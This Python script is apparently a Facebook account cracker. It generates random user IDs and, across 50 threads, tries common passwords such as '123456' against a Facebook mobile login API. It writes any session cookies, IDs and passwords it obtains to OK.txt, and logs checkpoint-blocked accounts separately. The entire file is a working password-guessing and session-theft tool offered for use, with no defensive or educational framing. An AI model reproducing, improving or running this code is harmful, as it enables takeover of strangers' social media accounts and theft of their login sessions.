import os
import sys
import random
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.live import Live
from rich.table import Table
from rich import print

def ua():
    rr = random.randint
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        f"(KHTML, like Gecko) Chrome/{rr(99,175)}.0.{rr(4500,4999)}.{rr(35,99)} Safari/537.36"
    )

oks = []
cks = []
loop = 0
total = 0

def render_ui():
    table = Table(title="[bold cyan]FACEBOOK CRACKING[/bold cyan]")

    table.add_column("STATUS", justify="center", style="bold green")
    table.add_column("OK", justify="center", style="bold green")
    table.add_column("CP", justify="center", style="bold yellow")
    table.add_column("PROGRESS", justify="center", style="bold white")

    progress = f"{loop}/{total}"

    table.add_row(
        "[cyan]Running...[/cyan]",
        str(len(oks)),
        str(len(cks)),
        progress
    )

    return table

def main():
    global total
    user = []

    os.system("clear")
    limit = int(input(" input limit: "))

    os.system("clear")
    print("—" * 30)
    print("[bold magenta]          MENU[/bold magenta]")
    print("—" * 30)
    print("[bright_white]1.[/bright_white] Crack ID 2011–2014")
    print("[bright_white]2.[/bright_white] Crack ID 2009–2010")
    print("—" * 30)

    ask = input("choice !> ")

    if ask == "1":
        star = "10000"
        for i in range(limit):
            user.append(str(random.randint(1000000000, 9999999999)))
    else:
        star = "100000"
        for i in range(limit):
            user.append(str(random.randint(100000000, 999999999)))

    total = len(user)

    with Live(render_ui(), refresh_per_second=20) as ui:
        with ThreadPool(max_workers=50) as pool:
            for mal in user:
                uid = star + mal
                pool.submit(login, uid, ui)

def login(uid, ui):
    global oks, cks, loop

    try:
        for pw in ["123456","1234567","12345678","123456789"]:

            headers = {
                "user-agent": ua(),
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger",
            }

            url = (
                "https://b-api.facebook.com/method/auth.login?format=json&email="
                + uid
                + "&password="
                + pw
                + "&credentials_type=device_based_login_password"
                "&generate_session_cookies=1&method=GET"
            )

            response = requests.get(url, headers=headers).json()

            if "session_key" in response:
                cookie = ";".join(
                    f"{i['name']}={i['value']}" for i in response.get("session_cookies", [])
                )
                oks.append(uid)

                open("OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                break

            elif "www.facebook.com" in str(response.get("error_msg", "")):
                cks.append(uid)

                open("CP.txt", "a").write(f"{uid}|{pw}\n")
                break

        loop += 1
        ui.update(render_ui())

    except:
        pass

if __name__ == "__main__":
    main()